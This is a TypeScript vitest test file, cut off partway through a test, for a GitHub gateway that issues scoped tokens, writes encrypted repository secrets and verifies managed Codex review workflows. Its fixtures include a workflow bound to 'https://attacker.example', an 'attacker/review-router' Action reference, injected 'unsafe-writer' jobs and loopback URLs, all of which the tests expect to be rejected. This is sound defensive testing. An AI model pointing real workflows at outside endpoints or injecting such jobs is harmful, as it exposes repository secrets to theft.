import { beforeEach, describe, expect, it, vi } from "vitest";
import { createHash } from "node:crypto";
import {
  allocateVersionedProviderSecretNamespace,
  assertActiveVersionedSecretWorkflowAttestation,
  CodexRotatingReviewActionV2Mode,
  CodexRotatingT0WorkflowSchemaVersion,
  renderCodexRotatingAdvisoryWorkflow,
} from "@reviewrouter/features-codex-oauth-rotating";
import {
  renderCanonicalCodexRotatingInteractionWorkflowV1,
  renderCanonicalCodexRotatingInteractionWorkflowV2,
  renderCodexRotatingInteractionWorkflow,
} from "@reviewrouter/features-workflow-provisioning";
import { OctokitCodexRotatingGitHubSecretGateway as ExplicitApiUrlOctokitCodexRotatingGitHubSecretGateway } from "./octokit-codex-rotating-github-secret-gateway.js";

class OctokitCodexRotatingGitHubSecretGateway extends ExplicitApiUrlOctokitCodexRotatingGitHubSecretGateway {
  constructor(
    options: Omit<
      ConstructorParameters<
        typeof ExplicitApiUrlOctokitCodexRotatingGitHubSecretGateway
      >[0],
      "expectedApiUrl"
    > & {
      readonly expectedApiUrl?: string;
    },
  ) {
    super({ expectedApiUrl: "https://api.reviewrouter.site", ...options });
  }
}

const mocks = vi.hoisted(() => ({
  auth: vi.fn(),
  request: vi.fn(),
}));

vi.mock("@octokit/app", () => ({
  App: vi.fn().mockImplementation(function App() {
    return {
      octokit: {
        auth: mocks.auth,
      },
    };
  }),
}));

vi.mock("@octokit/request", () => ({
  request: mocks.request,
}));

describe("OctokitCodexRotatingGitHubSecretGateway", () => {
  beforeEach(() => {
    mocks.auth.mockReset();
    mocks.request.mockReset();
  });

  it("requires an explicit canonical HTTPS API URL", () => {
    for (const expectedApiUrl of [
      "not-a-url",
      "http://api.reviewrouter.test",
      "https://user@api.reviewrouter.test",
      "https://api.reviewrouter.test/control-plane",
      "https://api.reviewrouter.test?tenant=1",
      "https://api.reviewrouter.test#workflow",
      "https://localhost",
      "https://service.localhost.",
      "https://127.0.0.2",
      "https://127.255.255.255",
      "https://[::1]",
      "https://[::ffff:127.0.0.1]",
      "https://[::ffff:7f00:1]",
    ]) {
      expect(
        () =>
          new ExplicitApiUrlOctokitCodexRotatingGitHubSecretGateway({
            appId: "123",
            privateKey: "private-key",
            expectedApiUrl,
          }),
      ).toThrowError(new Error("codex_rotating_workflow_api_url_invalid"));
    }
  });

  it("mints a repository-scoped Secrets: read token for runner public-key fetch", async () => {
    mocks.auth.mockResolvedValueOnce({
      token: "ghs_secret_read_token",
      expiresAt: "2026-05-25T12:15:00.000Z",
      permissions: { secrets: "read" },
    });

    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    const result = await gateway.issueSecretsReadToken({
      githubInstallationId: "129500385",
      githubRepositoryId: "123456",
      repositoryFullName: "777genius/example",
    });

    expect(mocks.auth).toHaveBeenCalledWith({
      type: "installation",
      installationId: 129500385,
      repositoryIds: [123456],
      permissions: { secrets: "read" },
    });
    expect(result.permissions).toEqual({ secrets: "read" });
  });

  it("writes only encrypted GitHub secret payloads with a repository-scoped Secrets: write token", async () => {
    mocks.auth.mockResolvedValueOnce({
      token: "ghs_secret_write_token",
      expiresAt: "2026-05-25T12:15:00.000Z",
      permissions: { secrets: "write" },
    });
    const secretPut = vi.fn().mockResolvedValueOnce({ status: 204 });

    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
      secretPut,
    });

    await expect(
      gateway.putEncryptedRepositorySecret({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
        repo: "example",
        secretName: "REVIEWROUTER_CODEX_AUTH_JSON",
        encryptedValue: "YWJj",
        keyId: "github-key-id",
      }),
    ).resolves.toEqual({ status: "accepted", statusCode: 204 });

    expect(secretPut).toHaveBeenCalledOnce();
    expect(secretPut).toHaveBeenCalledWith({
      baseUrl: "https://api.github.com",
      owner: "777genius",
      repo: "example",
      secretName: "REVIEWROUTER_CODEX_AUTH_JSON",
      encryptedValue: "YWJj",
      keyId: "github-key-id",
      token: "ghs_secret_write_token",
      timeoutMs: 15_000,
    });
  });

  it.each([
    CodexRotatingT0WorkflowSchemaVersion.VersionedSecretNamespaceV4,
    CodexRotatingT0WorkflowSchemaVersion.VersionedSecretNamespaceV5,
  ])(
    "publishes and verifies the exact schema-%i namespace on the default branch",
    async (workflowSchemaVersion) => {
      const currentNamespace = allocateVersionedProviderSecretNamespace({
        scope: {
          repositoryId: "123456",
          providerInstanceId: "codex-rotating:123456",
        },
        epoch: 8,
        randomBytes: () => new Uint8Array(16).fill(0x33),
      });
      const nextNamespace = allocateVersionedProviderSecretNamespace({
        scope: currentNamespace.scope,
        epoch: 9,
        randomBytes: () => new Uint8Array(16).fill(0x44),
      });
      const actionRef =
        "777genius/review-router@2222222222222222222222222222222222222222";
      const current = renderCodexRotatingAdvisoryWorkflow({
        actionRef,
        apiUrl: "https://reviewrouter.site",
        providerInstanceId: "codex-rotating:123456",
        reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
        workflowSchemaVersion,
        activeSecretNamespace: currentNamespace,
      });
      const next = renderCodexRotatingAdvisoryWorkflow({
        actionRef,
        apiUrl: "https://reviewrouter.site",
        providerInstanceId: "codex-rotating:123456",
        reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
        workflowSchemaVersion,
        activeSecretNamespace: nextNamespace,
      });
      mocks.auth
        .mockResolvedValueOnce({
          token: "ghs_contents_write_token",
          expiresAt: "2026-05-25T12:15:00.000Z",
          permissions: { contents: "write" },
        })
        .mockResolvedValueOnce({
          token: "ghs_contents_read_token",
          expiresAt: "2026-05-25T12:15:00.000Z",
          permissions: { contents: "read" },
        });
      mocks.request
        .mockResolvedValueOnce({
          data: {
            id: 123456,
            full_name: "777genius/example",
            default_branch: "main",
          },
        })
        .mockResolvedValueOnce({
          data: { name: "main", commit: { sha: "a".repeat(40) } },
        })
        .mockResolvedValueOnce({
          data: {
            type: "file",
            encoding: "base64",
            sha: gitBlobSha(current),
            content: Buffer.from(current).toString("base64"),
          },
        })
        .mockResolvedValueOnce({ data: { commit: { sha: "a".repeat(40) } } })
        .mockResolvedValueOnce({
          data: {
            type: "file",
            encoding: "base64",
            sha: gitBlobSha(next),
            content: Buffer.from(next).toString("base64"),
          },
        })
        .mockResolvedValueOnce({
          data: {
            id: 123456,
            full_name: "777genius/example",
            default_branch: "main",
          },
        })
        .mockResolvedValueOnce({
          data: { name: "main", commit: { sha: "a".repeat(40) } },
        });
      const gateway = new OctokitCodexRotatingGitHubSecretGateway({
        appId: "123",
        privateKey: "private-key",
        expectedApiUrl: "https://reviewrouter.site",
        trustedActionRefs: [actionRef],
      });
      await expect(
        gateway.publishAndVerifyVersionedWorkflow({
          repository: {
            workspaceId: "workspace-1",
            repositoryId: "repository-1",
            githubInstallationId: "129500385",
            githubRepositoryId: "123456",
            fullName: "777genius/example",
            owner: "777genius",
            selected: true,
            installationStatus: "active",
          },
          providerInstanceId: "codex-rotating:123456",
          namespace: nextNamespace,
        }),
      ).resolves.toMatchObject({
        repositoryId: "123456",
        workflowSourceCommitSha: "a".repeat(40),
        workflowSchemaVersion,
        secretNamespace: nextNamespace,
        sourceTrust: "trusted_default_branch_revision",
      });
      expect(mocks.request).toHaveBeenNthCalledWith(
        4,
        "PUT /repos/{owner}/{repo}/contents/{path}",
        expect.objectContaining({
          branch: "main",
          sha: gitBlobSha(current),
          content: Buffer.from(next).toString("base64"),
        }),
      );
    },
  );

  it("pins an unchanged active namespace before the default branch moves", async () => {
    const activeNamespace = allocateVersionedProviderSecretNamespace({
      scope: {
        repositoryId: "123456",
        providerInstanceId: "codex-rotating:123456",
      },
      epoch: 8,
      randomBytes: () => new Uint8Array(16).fill(0x33),
    });
    const actionRef =
      "777genius/review-router@2222222222222222222222222222222222222222";
    const current = renderCodexRotatingAdvisoryWorkflow({
      actionRef,
      apiUrl: "https://reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
      workflowSchemaVersion:
        CodexRotatingT0WorkflowSchemaVersion.VersionedSecretNamespaceV4,
      activeSecretNamespace: activeNamespace,
    });
    const pinnedHeadSha = "a".repeat(40);
    const movedHeadSha = "b".repeat(40);
    mocks.auth
      .mockResolvedValueOnce({
        token: "ghs_contents_write_token",
        expiresAt: "2026-05-25T12:15:00.000Z",
        permissions: { contents: "write" },
      })
      .mockResolvedValueOnce({
        token: "ghs_contents_read_token",
        expiresAt: "2026-05-25T12:15:00.000Z",
        permissions: { contents: "read" },
      });
    mocks.request
      .mockResolvedValueOnce({
        data: {
          id: 123456,
          full_name: "777genius/example",
          default_branch: "main",
        },
      })
      .mockResolvedValueOnce({
        data: { name: "main", commit: { sha: pinnedHeadSha } },
      })
      .mockResolvedValueOnce({
        data: {
          type: "file",
          encoding: "base64",
          sha: gitBlobSha(current),
          content: Buffer.from(current).toString("base64"),
        },
      })
      .mockResolvedValueOnce({
        data: {
          type: "file",
          encoding: "base64",
          sha: gitBlobSha(current),
          content: Buffer.from(current).toString("base64"),
        },
      })
      .mockResolvedValueOnce({
        data: {
          id: 123456,
          full_name: "777genius/example",
          default_branch: "main",
        },
      })
      .mockResolvedValueOnce({
        data: { name: "main", commit: { sha: movedHeadSha } },
      })
      .mockResolvedValueOnce({ data: { status: "ahead" } });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
      expectedApiUrl: "https://reviewrouter.site",
      trustedActionRefs: [actionRef],
    });

    await expect(
      gateway.publishAndVerifyVersionedWorkflow({
        repository: {
          workspaceId: "workspace-1",
          repositoryId: "repository-1",
          githubInstallationId: "129500385",
          githubRepositoryId: "123456",
          fullName: "777genius/example",
          owner: "777genius",
          selected: true,
          installationStatus: "active",
        },
        providerInstanceId: "codex-rotating:123456",
        namespace: activeNamespace,
      }),
    ).resolves.toMatchObject({
      repositoryId: "123456",
      workflowSourceCommitSha: pinnedHeadSha,
      secretNamespace: activeNamespace,
      sourceTrust: "trusted_default_branch_revision",
    });
    expect(
      mocks.request.mock.calls.some(
        ([route]) => route === "PUT /repos/{owner}/{repo}/contents/{path}",
      ),
    ).toBe(false);
    expect(mocks.request).toHaveBeenNthCalledWith(
      3,
      "GET /repos/{owner}/{repo}/contents/{path}",
      expect.objectContaining({ ref: pinnedHeadSha }),
    );
  });

  it("mints a repository-scoped read token for safe checkout and PR loading", async () => {
    mocks.auth.mockResolvedValueOnce({
      token: "ghs_contents_read_token",
      expiresAt: "2026-05-25T12:15:00.000Z",
      permissions: { contents: "read", pull_requests: "read" },
    });

    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.issueContentsReadToken({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
      }),
    ).resolves.toEqual({
      token: "ghs_contents_read_token",
      expiresAt: new Date("2026-05-25T12:15:00.000Z"),
      permissions: { contents: "read", pullRequests: "read" },
    });

    expect(mocks.auth).toHaveBeenCalledWith({
      type: "installation",
      installationId: 129500385,
      repositoryIds: [123456],
      permissions: { contents: "read", pull_requests: "read" },
    });
  });

  it("rejects unexpected GitHub secret write statuses", async () => {
    mocks.auth.mockResolvedValueOnce({
      token: "ghs_secret_write_token",
      expiresAt: "2026-05-25T12:15:00.000Z",
      permissions: { secrets: "write" },
    });
    const secretPut = vi.fn().mockResolvedValueOnce({ status: 200 });

    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
      secretPut,
    });

    await expect(
      gateway.putEncryptedRepositorySecret({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
        repo: "example",
        secretName: "REVIEWROUTER_CODEX_AUTH_JSON",
        encryptedValue: "YWJj",
        keyId: "github-key-id",
      }),
    ).rejects.toThrow("codex_rotating_secret_put_unexpected_status");
  });

  it("labels token-mint failure as definitively pre-dispatch", async () => {
    mocks.auth.mockRejectedValueOnce(new Error("installation unavailable"));
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });
    await expect(
      gateway.putEncryptedRepositorySecret({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
        repo: "example",
        secretName: "REVIEWROUTER_CODEX_AUTH_JSON",
        encryptedValue: "YWJj",
        keyId: "github-key-id",
      }),
    ).rejects.toMatchObject({ outcome: "pre_dispatch_failure" });
    expect(mocks.request).not.toHaveBeenCalled();
  });

  it.each([
    {
      options: { secretPutBaseUrl: "not-a-url" },
      token: "ghs_secret_write_token",
    },
    {
      options: { secretPutBaseUrl: "http://example.com" },
      token: "ghs_secret_write_token",
    },
    {
      options: { secretPutTimeoutMs: 0 },
      token: "ghs_secret_write_token",
    },
    {
      options: {},
      token: "invalid\ninstallation-token",
    },
  ])(
    "labels deterministic one-shot construction failure %# as pre-dispatch",
    async ({ options, token }) => {
      mocks.auth.mockResolvedValueOnce({
        token,
        expiresAt: "2026-05-25T12:15:00.000Z",
        permissions: { secrets: "write" },
      });
      const gateway = new OctokitCodexRotatingGitHubSecretGateway({
        appId: "123",
        privateKey: "private-key",
        ...options,
      });
      await expect(
        gateway.putEncryptedRepositorySecret({
          githubInstallationId: "129500385",
          githubRepositoryId: "123456",
          repositoryFullName: "777genius/example",
          owner: "777genius",
          repo: "example",
          secretName: "REVIEWROUTER_CODEX_AUTH_JSON",
          encryptedValue: "YWJj",
          keyId: "github-key-id",
        }),
      ).rejects.toMatchObject({ outcome: "pre_dispatch_failure" });
    },
  );

  it("rejects a truly old schema-1 workflow without a versioned namespace", async () => {
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef:
        "777genius/review-router@0123456789abcdef0123456789abcdef01234567",
      apiUrl: "https://reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
    })
      .replaceAll(", converted_to_draft", "")
      .replace(
        "          max-changed-lines: ${{ vars.REVIEW_ROUTER_MAX_CHANGED_LINES }}\n",
        "",
      )
      .replace(
        "          review-timeout-minutes: ${{ vars.REVIEW_ROUTER_TIMEOUT_MINUTES || '60' }}\n",
        "",
      )
      .replace(
        "    timeout-minutes: ${{ fromJSON(vars.REVIEW_ROUTER_TIMEOUT_MINUTES || '60') }}",
        "    timeout-minutes: 60",
      );
    mocks.auth.mockResolvedValueOnce({
      token: "ghs_contents_read_token",
      expiresAt: "2026-05-25T12:15:00.000Z",
      permissions: { contents: "read" },
    });
    mocks.request.mockResolvedValueOnce({
      data: {
        type: "file",
        encoding: "base64",
        content: Buffer.from(workflow, "utf8").toString("base64"),
      },
    });

    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
      expectedApiUrl: "https://reviewrouter.site",
    });

    await expect(
      gateway.verifyWorkflowSource({
        repository: {
          githubInstallationId: "129500385",
          githubRepositoryId: "123456",
          fullName: "777genius/example",
          owner: "777genius",
        },
        workflowSha: "abcdefabcdefabcdefabcdefabcdefabcdefabcd",
        workflowRef:
          "777genius/example/.github/workflows/reviewrouter-codex.yml@refs/heads/main",
        workflowPath: ".github/workflows/reviewrouter-codex.yml",
        expectedActionOwnerRepo: "777genius/review-router",
        expectedProviderInstanceId: "codex-rotating:123456",
        expectedWorkflowSchemaVersion: 1,
      }),
    ).rejects.toThrow("codex_rotating_workflow_mapping_required");

    expect(mocks.request).toHaveBeenCalledWith(
      "GET /repos/{owner}/{repo}/contents/{path}",
      {
        owner: "777genius",
        repo: "example",
        path: ".github/workflows/reviewrouter-codex.yml",
        ref: "abcdefabcdefabcdefabcdefabcdefabcdefabcd",
        headers: {
          authorization: "Bearer ghs_contents_read_token",
        },
      },
    );
  });

  it("accepts only an immutable T0 workflow inventory without legacy writers", async () => {
    const actionSha = "a".repeat(40);
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    mockManagedWorkflowInventory({ reviewWorkflow: workflow });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({
      compatible: true,
      inventoryHash: expect.stringMatching(/^[a-f0-9]{64}$/),
      actionCommitSha: expect.stringMatching(/^[a-f0-9]{40}$/),
      workflowSchemaVersion: 1,
      defaultBranchHeadSha: expect.stringMatching(/^[a-f0-9]{40}$/),
    });
  });

  it("reports canonical client-triggered T0 workflow schema v2", async () => {
    const actionSha = "a".repeat(40);
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      workflowSchemaVersion: 2,
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    mockManagedWorkflowInventory({ reviewWorkflow: workflow });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({
      compatible: true,
      actionCommitSha: actionSha,
      workflowSchemaVersion: 2,
    });
  });

  it.each([
    ["current V3", renderCodexRotatingInteractionWorkflow],
    ["prior V2", renderCanonicalCodexRotatingInteractionWorkflowV2],
    ["legacy V1", renderCanonicalCodexRotatingInteractionWorkflowV1],
  ])(
    "attests the %s interaction workflow at the signed workflow revision",
    async (_version, renderInteractionWorkflow) => {
      const actionRef = `777genius/review-router@${"a".repeat(40)}`;
      const codexWorkflow = renderCodexRotatingAdvisoryWorkflow({
        actionRef,
        apiUrl: "https://api.reviewrouter.site",
        providerInstanceId: "codex-rotating:123456",
        reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
      });
      const interactionWorkflow = `# formatting is not authority
${renderInteractionWorkflow({
  actionRef,
  apiUrl: "https://api.reviewrouter.site",
  runtimeConfigMode: "oidc",
})}`;
      mocks.auth.mockResolvedValueOnce({
        token: "ghs_contents_read_token",
        expiresAt: "2026-05-25T12:15:00.000Z",
        permissions: { contents: "read" },
      });
      mocks.request
        .mockResolvedValueOnce(fileContent(codexWorkflow))
        .mockResolvedValueOnce(fileContent(interactionWorkflow));
      const gateway = new OctokitCodexRotatingGitHubSecretGateway({
        appId: "123",
        privateKey: "private-key",
        trustedActionRefs: [actionRef],
      });

      await expect(
        gateway.verifyManagedV2SessionBootstrapSource({
          githubInstallationId: "129500385",
          githubRepositoryId: "123456",
          repositoryFullName: "777genius/example",
          owner: "777genius",
          workflowPath: ".github/workflows/reviewrouter-interaction.yml",
          workflowSha: "b".repeat(40),
        }),
      ).resolves.toEqual({ compatible: true });
      expect(mocks.request).toHaveBeenCalledTimes(2);
      expect(mocks.request).toHaveBeenNthCalledWith(
        1,
        "GET /repos/{owner}/{repo}/contents/{path}",
        expect.objectContaining({ ref: "b".repeat(40) }),
      );
    },
  );

  it("rejects non-canonical or unregistered managed workflow source", async () => {
    const actionRef = `777genius/review-router@${"a".repeat(40)}`;
    const workflow = `${renderCodexRotatingAdvisoryWorkflow({
      actionRef,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    })}

  "unsafe-writer":
    "runs-on": ubuntu-latest
    "steps":
      - "run": echo unsafe`;
    mocks.auth.mockResolvedValueOnce({
      token: "ghs_contents_read_token",
      expiresAt: "2026-05-25T12:15:00.000Z",
      permissions: { contents: "read" },
    });
    mocks.request.mockResolvedValueOnce(fileContent(workflow));
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
      trustedActionRefs: [actionRef],
    });

    await expect(
      gateway.verifyManagedV2SessionBootstrapSource({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
        workflowPath: ".github/workflows/reviewrouter-codex.yml",
        workflowSha: "b".repeat(40),
      }),
    ).resolves.toEqual({ compatible: false });
  });

  it("reports transient GitHub source-read failures as retryable", async () => {
    mocks.auth.mockResolvedValueOnce({
      token: "ghs_contents_read_token",
      expiresAt: "2026-05-25T12:15:00.000Z",
      permissions: { contents: "read" },
    });
    mocks.request.mockRejectedValueOnce({ status: 503 });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
      trustedActionRefs: [`777genius/review-router@${"a".repeat(40)}`],
    });

    await expect(
      gateway.verifyManagedV2SessionBootstrapSource({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
        workflowPath: ".github/workflows/reviewrouter-codex.yml",
        workflowSha: "b".repeat(40),
      }),
    ).rejects.toThrow("managed_workflow_source_temporarily_unavailable");
  });

  it("rejects a T0 workflow bound to an unexpected API endpoint", async () => {
    const actionSha = "a".repeat(40);
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://attacker.example",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    mockManagedWorkflowInventory({ reviewWorkflow: workflow });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
      expectedApiUrl: "https://api.reviewrouter.site",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({
      compatible: false,
      actionCommitSha: actionSha,
    });
  });

  it("rejects additional jobs in a managed T0 workflow", async () => {
    const actionSha = "a".repeat(40);
    const workflow = `${renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    })}

  unsafe-writer:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - run: echo unsafe
`;
    mockManagedWorkflowInventory({ reviewWorkflow: workflow });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({
      compatible: false,
      actionCommitSha: null,
    });
  });

  it("rejects the combined legacy reusable workflow as T0 authority", async () => {
    const actionSha = "a".repeat(40);
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    }).replace(
      "/.github/workflows/reviewrouter-t0-reusable.yml@",
      "/.github/workflows/reviewrouter-reusable.yml@",
    );
    mockManagedWorkflowInventory({ reviewWorkflow: workflow });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({
      compatible: false,
    });
  });

  it("rejects a default workflow bound to a different Action repository", async () => {
    const actionSha = "a".repeat(40);
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `attacker/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    mockManagedWorkflowInventory({ reviewWorkflow: workflow });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({
      compatible: false,
      actionCommitSha: actionSha,
    });
  });

  it("rejects an authoritative ref with a different provider binding", async () => {
    const actionSha = "a".repeat(40);
    const defaultWorkflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    const mismatchedWorkflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:654321",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    mockManagedWorkflowInventory({
      reviewWorkflow: defaultWorkflow,
      activePullRequests: [
        {
          number: 240,
          baseRef: "dev",
          baseHeadSha: "d".repeat(40),
          headSha: "c".repeat(40),
          mergeCommitSha: "e".repeat(40),
          reviewWorkflowAtBase: defaultWorkflow,
          reviewWorkflowAtMerge: mismatchedWorkflow,
        },
      ],
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({ compatible: false });
  });

  it("rejects a stale legacy writer on an active non-default PR base branch", async () => {
    const actionSha = "a".repeat(40);
    const t0Workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    const legacyWorkflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
    });
    mockManagedWorkflowInventory({
      reviewWorkflow: t0Workflow,
      activePullRequests: [
        {
          number: 240,
          baseRef: "dev",
          baseHeadSha: "d".repeat(40),
          headSha: "c".repeat(40),
          reviewWorkflowAtBase: legacyWorkflow,
        },
      ],
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({
      compatible: false,
      actionCommitSha: actionSha,
    });
  });

  it("accepts an active PR base branch pinned to the selected T0 runtime", async () => {
    const actionSha = "a".repeat(40);
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    mockManagedWorkflowInventory({
      reviewWorkflow: workflow,
      activePullRequests: [
        {
          number: 240,
          baseRef: "dev",
          baseHeadSha: "d".repeat(40),
          headSha: "c".repeat(40),
          reviewWorkflowAtBase: workflow,
        },
      ],
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({
      compatible: true,
      actionCommitSha: actionSha,
    });
  });

  it("fails closed when an inventoried PR base branch moves during inspection", async () => {
    const actionSha = "a".repeat(40);
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    mockManagedWorkflowInventory({
      reviewWorkflow: workflow,
      activePullRequests: [
        {
          number: 240,
          baseRef: "dev",
          baseHeadSha: "d".repeat(40),
          movedBaseHeadSha: "e".repeat(40),
          headSha: "c".repeat(40),
          reviewWorkflowAtBase: workflow,
        },
      ],
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).rejects.toThrow("codex_rotating_workflow_inventory_coverage_moved");
  });

  it("rejects a legacy workflow in the current merge ref of a mergeable PR", async () => {
    const actionSha = "a".repeat(40);
